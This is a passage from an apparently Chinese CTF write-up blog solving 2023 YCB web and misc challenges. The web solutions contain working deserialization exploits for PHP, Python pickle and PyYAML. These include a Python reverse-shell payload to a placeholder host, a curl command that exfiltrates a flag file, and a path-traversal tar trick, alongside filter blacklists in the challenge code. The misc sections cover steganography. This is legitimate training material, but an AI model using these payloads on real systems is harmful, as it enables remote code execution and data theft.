class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ycb</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;now = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = True;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;CTF-&gt;<span class="hljs-title function_ invoke__">ycb</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fine-&gt;<span class="hljs-title function_ invoke__">YCB1</span>(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prohib</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">prohib</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>一个php反序列化，从hint中得知flag位置不在根目录，所以<code>Pro</code>类可以舍弃<br>发现敏感函数<code>call_user_func</code>，所以最终应该要调用<code>__call</code>，而在<code>Bei</code>中<code>__destruct()</code>存在函数调用，poc如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bei</span>();<br><br><span class="hljs-variable">$a</span> -&gt; CTF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-variable">$a</span> -&gt; fine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; rce = <span class="hljs-string">&quot;/tmp/catcatf1ag.txt&quot;</span>;<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; now = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;YCB1&quot;</span>=&gt;<span class="hljs-string">&quot;highlight_file&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p><code>O%3A3%3A%22Bei%22%3A3%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A14%3A%22highlight_file%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3B%7D</code></p>
<p>最后那个过滤用<code>highlight_file</code>函数或者双写都可以绕过</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-2.png"></p>
<h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p><a href="http://www.zip下载源码/">www.zip下载源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/verification&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verification</span>():<br>    <span class="hljs-keyword">try</span>:<br>        attribute = session.get(<span class="hljs-string">&#x27;Attribute&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(attribute, <span class="hljs-built_in">dict</span>):<br>            <span class="hljs-keyword">raise</span> Exception<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hacker!!!&#x27;</span><br>    <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> secret<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Don&#x27;t play tricks on me&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are a perfect stranger to me&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>

<p>访问<code>/verification</code>，进行session伪造，得到<code>Hello admin, welcome to /ppppppppppick1e</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-3.png"></p>
<p>访问<code>/ppppppppppick1e</code>，得到<code>Hint: Source in /src0de</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src0de&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src0de</span>():<br>    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    rsp = f.read()<br>    f.close()<br>    <span class="hljs-keyword">return</span> rsp[rsp.index(<span class="hljs-string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppppppppppick1e</span>():<br>    <span class="hljs-keyword">try</span>:<br>        username = <span class="hljs-string">&quot;admin&quot;</span><br>        rsp = make_response(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)<br>        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span><br>        pick1e = request.cookies.get(<span class="hljs-string">&#x27;pick1e&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pick1e <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            pick1e = base64.b64decode(pick1e)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> rsp<br>        <span class="hljs-keyword">if</span> check(pick1e):<br>            pick1e = pickle.loads(pick1e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Go for it!!!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Way!!!&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">return</span> error_message<br><br>    <span class="hljs-keyword">return</span> rsp<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GWHT</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>

<p>pickle反序列化rce</p>
<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br></code></pre></td></tr></table></figure>

<p>发现没有权限</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-4.png"></p>
<p>查找有权限的命令</p>
<p><code>find /bin/ -perm 777</code>或者<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p>发现python3有权限，使用python3读flag<br><code>python3 -c &#39;print(open(&quot;/flag&quot;).read())&#39;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-5.png"></p>
<h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] =<span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>)+<span class="hljs-string">&quot;Boogipopisweak&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>)<br>    m1sery=[request.args.get(<span class="hljs-string">&quot;m1sery&quot;</span>,<span class="hljs-string">&quot;Doctor.Boogipop&quot;</span>)]<br>    <span class="hljs-keyword">if</span>(session.get(<span class="hljs-string">&quot;name&quot;</span>)==<span class="hljs-string">&quot;Dr.Boog1pop&quot;</span>):<br>        blacklist=re.findall(<span class="hljs-string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker no way&quot;</span><br>        <span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;for [<span class="hljs-subst">&#123;name&#125;</span>] in [<span class="hljs-subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;Doctor&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,name=session.get(<span class="hljs-string">&quot;name&quot;</span>))<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>        file = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>        fileblacklist=re.findall(<span class="hljs-string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> fileblacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker!&quot;</span><br>        start=request.args.get(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        end=request.args.get(<span class="hljs-string">&quot;end&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        <span class="hljs-keyword">if</span> start==<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">and</span> end==<span class="hljs-string">&quot;0&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        <span class="hljs-keyword">else</span>:<br>            start,end=<span class="hljs-built_in">int</span>(start),<span class="hljs-built_in">int</span>(end)<br>            f=<span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>)<br>            f.seek(start)<br>            data=f.read(end)<br>            <span class="hljs-keyword">return</span> data<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_page</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(os.path.pardir)<br>    <span class="hljs-built_in">print</span>(path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;templates/&quot;</span> + path):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not found&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> render_template(path)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p>有个任意文件读取，非预期解就直接读环境变量了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-6.png"></p>
<h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    flag = <span class="hljs-literal">True</span><br>    blacklist = [<span class="hljs-string">&#x27;bytes&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;frozenset&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;tuple&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;listitems&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;apply&#x27;</span>]<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(s).lower():<br>            flag= <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFile</span>(<span class="hljs-params">filepath, <span class="hljs-built_in">type</span></span>):<br><br>    extractdir = filepath.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractdir):<br>        os.makedirs(extractdir)<br><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;tar&#x27;</span>:<br>        tf = tarfile.TarFile(filepath)<br>        tf.extractall(extractdir)<br>        <span class="hljs-keyword">return</span> tf.getnames()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        fn = <span class="hljs-string">&#x27;uploads/&#x27;</span> + md5().hexdigest()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fn):<br>            os.makedirs(fn)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        upFile = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(upFile)<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span><br><br>        savePath = <span class="hljs-string">f&quot;uploads/<span class="hljs-subst">&#123;upFile.filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(savePath)<br>        upFile.save(savePath)<br><br>        <span class="hljs-keyword">if</span> tarfile.is_tarfile(savePath):<br>            zipDatas = extractFile(savePath, <span class="hljs-string">&#x27;tar&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">if</span> request.args:<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;config/<span class="hljs-subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            Config = yaml.load(f.read())<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, username=<span class="hljs-string">&quot;admin&quot;</span>, message=<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure>

<p>&#x2F;upload路由中上传tar文件，然后通过&#x2F;src路由进行yaml解析，存在PyYAML反序列化漏洞</p>
<p>poc</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/apply:os.system</span> [<span class="hljs-string">&quot;curl http://ip:7777/?flag=`cat /fl*|base64`&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>制作tar包<br><code>tar cPvf test.tar ../../config/config.yaml</code></p>
<p>上传后访问<code>/src?username=config</code>触发</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-7.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ai和nia的交响曲"><a href="#ai和nia的交响曲" class="headerlink" title="ai和nia的交响曲"></a>ai和nia的交响曲</h2><p>upload.php中上传了一个flag1.png</p>
<p>其中每条黑线到下条黑线恰好8bit，把黑色当成0，白色当成1，竖着读取后转字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br>width, height = img.size<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        pixel = img.getpixel((i, j))[<span class="hljs-number">0</span>]<br>        flag += <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">if</span> pixel &gt;= <span class="hljs-number">30</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;0&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;outs.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(flag)<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">8</span>):<br>    byte = flag[i:i+<span class="hljs-number">8</span>]<br>    decimal = <span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>)<br>    result += <span class="hljs-built_in">chr</span>(decimal)<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>结尾得到<code>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</code></p>
<p>http流中还有一个flag2.zip，发现是伪加密</p>
<p>解压后的内容如下，其中还有0宽，但没什么用</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">10</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">13</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">09</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure>

<p>在hint中给的视频地址去找字母，得到<code>CAOCAOGAIFAN</code></p>
<p>组合后为flag：<code>@i_n1a_l0v3S_CAOCAOGAIFAN</code></p>
<h2 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h2><p>高度不对，先爆破出正确的宽高</p>
<p>发现两个iend，猜测是snipping的CVE</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-1.png"></p>
<h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h2><p>osfmount挂载，有三个盘</p>
<p>分别拿到<code>encrypt</code>，<code>normal_rar.rar</code>，<code>not_real_cat.jpg</code></p>
<p>其中rar可以分离出一张jpg，大小样式与另一张jpg一样，使用双图盲水印</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-2.png"></p>
<p>使用<code>veracrypt</code>挂载<code>encrypt</code>，密码为<code>watermark_is_fun</code></p>
<p>拿到<code>KBAUYVCSKR5XK5TYM5SGC3LMNJXWY4BQPBPXSYLVL54TCZLCL5UHUM27NUYTI4JBEEQX2===‌‍</code></p>
<p>存在零宽隐写，解密后得到<code>Matryoshka</code></p>
<p>base32后猜测是维吉尼亚</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-3.png"></p>
<h2 id="程序猿Quby"><a href="#程序猿Quby" class="headerlink" title="程序猿Quby"></a>程序猿Quby</h2><p>QUBY.png可以分离出一个带密码的rar</p>
<p>图片本身的信息是夏多密码，根据码表转换得到<code>HAVEANICEDAY</code></p>
<p>注意1，6，12分别表示顺时针旋转180°，90°，0°</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-4.png"></p>
<p>然后对图片解cloacked-pixel</p>
<p><code>python2 lsb.py extract QUBY.png out.txt HAVEANICEDAY</code></p>
<p>得到压缩包密码<code>we1c0met0ycbCTF!!!</code>，解压得到一段wav和两张xlsx表</p>
